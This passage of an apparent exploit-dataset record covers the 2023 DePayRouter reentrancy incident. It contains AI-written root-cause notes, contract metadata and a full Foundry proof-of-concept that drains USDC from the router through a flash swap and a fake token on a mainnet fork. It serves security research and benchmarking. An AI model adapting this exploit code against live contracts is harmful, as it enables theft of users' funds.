anipulated the balances during the reentrant call, the `_ensureBalance` check passes incorrectly, allowing the attacker to drain funds. || The attacker's contract then transfers the stolen funds to itself.", "ai_confidence_has_source_code": true, "ai_confidence_known_pattern_match": true, "ai_confidence_reasoning": "2 verified, 1 proxy", "ai_confidence_score": 0.95, "ai_confidence_verified_contracts": true, "ai_explanation": "The attacker exploited a reentrancy vulnerability in the DePayRouter contract. The attacker's contract, which implements the `uniswapV2Call` hook, initiates a swap that calls the `DepayRouter.route` function. Within the `uniswapV2Call` function, before the `DepayRouter.route` call fully completes, the attacker adds liquidity to a Uniswap V2 pair, approves the router for the newly created pair, and then removes liquidity. This sequence, combined with the reentrant call back into `DepayRouter.route`, allows the attacker to manipulate the internal state of the DePayRouter and drain funds. Specifically, the `_balanceBefore` function is called at the beginning of `route`, and the `_ensureBalance` function is called at the end. The reentrancy allows the attacker to perform operations that alter the balance of the token between these two checks, effectively bypassing the intended balance verification.", "ai_mitigation": [], "ai_root_cause": "Reentrancy", "ai_vulnerability_type": "Reentrancy", "attack_title": "Tx : https://etherscan.io/tx/0x9a036058afb58169bfa91a826f5fcf4c0a376e650960669361d61bef99205f35", "contracts": [{"abi_available": true, "address": "0xae60ac8e69414c2dc362d0e6a03af643d1d85b92", "artifact_dir": "data/contracts/2023_10_depayrouter/contracts/01_vulnerable_ae60ac8e_depayrouterv1", "bytecode_available": false, "chain": {"id": 1, "name": "Ethereum"}, "compiler_version": "v0.7.6+commit.7338295f", "contract_name": "DePayRouterV1", "explorer_url": "https://etherscan.io/address/0xae60ac8e69414c2dc362d0e6a03af643d1d85b92", "fetch_error": null, "is_verified": true, "proxy": {"admin_address": null, "implementation_address": "0xe04b08dfc6caa0f4ec523a3ae283ece7efe00019", "is_proxy": true, "proxy_type": "EIP1967", "resolution_depth": 1, "resolved_at": "2026-04-10T06:25:20.300Z"}, "role": "vulnerable", "source_available": true, "source_files": ["data/contracts/2023_10_depayrouter/contracts/01_vulnerable_ae60ac8e_depayrouterv1/source.sol"], "source_hint": "AI extracted: The DePayRouter contract's `route` function is vulnerable to reentrancy. The `uniswapV2Call` function in the attacker contract calls `DepayRouter.route` and then performs a `newUniPair.approve` and `UniRouter.removeLiquidity` before the `DepayRouter.route` function has finished executing. This allows the attacker to manipulate the state of the DePayRouter contract and drain funds.", "verification_status": "proxy"}, {"abi_available": true, "address": "0xe04b08dfc6caa0f4ec523a3ae283ece7efe00019", "artifact_dir": "data/contracts/2023_10_depayrouter/contracts/02_helper_e04b08df_depayrouterv1uniswap01", "bytecode_available": true, "chain": {"id": 1, "name": "Ethereum"}, "compiler_version": "v0.7.6+commit.7338295f", "contract_name": "DePayRouterV1Uniswap01", "explorer_url": "https://etherscan.io/address/0xe04b08dfc6caa0f4ec523a3ae283ece7efe00019", "fetch_error": null, "is_verified": true, "proxy": {"admin_address": null, "implementation_address": null, "is_proxy": false, "proxy_type": null, "resolution_depth": 0, "resolved_at": "2026-04-10T06:25:20.300Z"}, "role": "helper", "source_available": true, "source_files": ["data/contracts/2023_10_depayrouter/contracts/02_helper_e04b08df_depayrouterv1uniswap01/source.sol"], "source_hint": "implementation of 0xae60ac8e69414c2dc362d0e6a03af643d1d85b92", "verification_status": "verified"}], "contracts_dir": "data/contracts/2023_10_depayrouter", "id": "2023_10_depayrouter", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:25:29.269Z"}, "num_bytecode_contracts": 1, "num_contracts": 2, "num_source_contracts": 2, "num_verified_contracts": 2, "poc_code": "// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~827 USDC
// Attacker : https://etherscan.io/address/0x7f284235aef122215c46656163f39212ffa77ed9
// Attack Contract :https://etherscan.io/address/0xba2aa7426ec6529c25a38679478645b2db5fa19b
// Vulnerable Contract : https://etherscan.io/address/0xae60ac8e69414c2dc362d0e6a03af643d1d85b92
// Attack Tx : https://etherscan.io/tx/0x9a036058afb58169bfa91a826f5fcf4c0a376e650960669361d61bef99205f35

// @Analysis
// Twitter Guy : https://twitter.com/CertiKAlert/status/1709764146324009268

interface IDepayRouterV1 {
    function route(
        // The path of the token conversion.
        address[] calldata path,
        // Amounts passed to processors:
        // e.g. [amountIn, amountOut, deadline]
        uint256[] calldata amounts,
        // Addresses passed to plugins:
        // e.g. [receiver]
        address[] calldata addresses,
        // List and order of plugins to be executed for this payment:
        // e.g. [Uniswap,paymentPlugin] to swap and pay
        address[] calldata plugins,
        // Data passed to plugins:
        // e.g. ["signatureOfSmartContractFunction(address,uint)"] receiving the payment
        string[] calldata data
    ) external payable returns (bool);
}

contract ContractTest is Test {
    IUSDC USDC = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUniswapV2Pair UNIV2 = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniswapV2Router UniRouter = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IDepayRouterV1 DepayRouter = IDepayRouterV1(0xae60aC8e69414C2Dc362D0e6a03af643d1D85b92);
    IUniswapV2Factory UniFactory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    uint256 amount = 1_755_923_836;
    address DePayUniV1 = 0xe04b08Dfc6CaA0F4Ec523a3Ae283Ece7efE00019;

    function conAddress(address address1, address address2) public pure returns (bytes memory) {
        bytes32 concatenated;
        assembly {
            mstore(concatenated, address1)
            mstore(add(concatenated, 0x14), address2)
        }
        return abi.encodePacked(concatenated);
    }

    function setUp() public {
        vm.createSelectFork("mainnet", 18_281_130 - 1);
        vm.label(address(USDC), "USDC");
        vm.label(address(UNIV2), "UNIV2: USDC");
        vm.label(address(UniRouter), "UniRouter");
        vm.label(address(UniFactory), "UniFactory");
        vm.label(address(DepayRouter), "DepayRouter");
        approveAll();
    }

    function testExploit() external {
        uint256 startUSDC = USDC.balanceOf(address(this));
        console.log("Before Start: %d USDC", startUSDC);
        UNIV2.swap(amount, 0, address(this), conAddress(address(USDC), address(DepayRouter)));

        uint256 intExp = USDC.balanceOf(address(this)) / 1e6;
        uint256 decExp = USDC.balanceOf(address(this)) - intExp * 1e6;
        console.log("Attack Exploit: %s.%s USDC", intExp, decExp);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        uint256 amountAMin = 877_961_918;
        ERC20ops();
        uint256 amountA;
        uint256 amountB;
        uint256 liquidity;
        (amountA, amountB, liquidity) =
            UniRouter.addLiquidity(sender, address(USDC), 1e30, 1, amountAMin, 1, address(this), type(uint256).max);
        IUniswapV2Pair newUniPair = IUniswapV2Pair(UniFactory.getPair(address(this), address(USDC)));

        address[] memory path = new address[](2);
        (path[0], path[1]) = (address(USDC), address(this));
        uint256[] memory amounts = new uint256[](3);
        (amounts[0], amounts[1], amounts[2]) = (amountAMin, 0, type(uint256).max);
        address[] memory addresses = new address[](2);
        (addresses[0], addresses[1]) = (address(this), address(this));
        address[] memory plugins = new address[](2);
        (plugins[0], plugins[1]) = (DePayUniV1, DePayUniV1);
        string[] memory data = new string[](1);
        DepayRouter.route(path, amounts, addresses, plugins, data);

        newUniPair.approve(address(UniRouter), liquidity);
        UniRouter.removeLiquidity(address(this), address(USDC), liquidity, 1, 1, address(this), type(uint256).max);

        USDC.transfer(address(UNIV2), amount * 1001 / 997);
    }

    function approveAll() internal {
        USDC.approve(address(UniRouter), type(uint256).max);
        USDC.approve(address(DepayRouter), type(uint256).max);
    }

    function ERC20ops() internal {
        balances[address(this)] = 1e30 + 1;
    }

    mapping(address => uint256) public balances;

    function balanceOf(
        address account
    ) public view virtual returns (uint256) {
        return balances[account];
    }

    function transfer(address to, uint256 value) public virtual returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal {
        balances[from] -= value;
        balances[to] += value;
    }
}
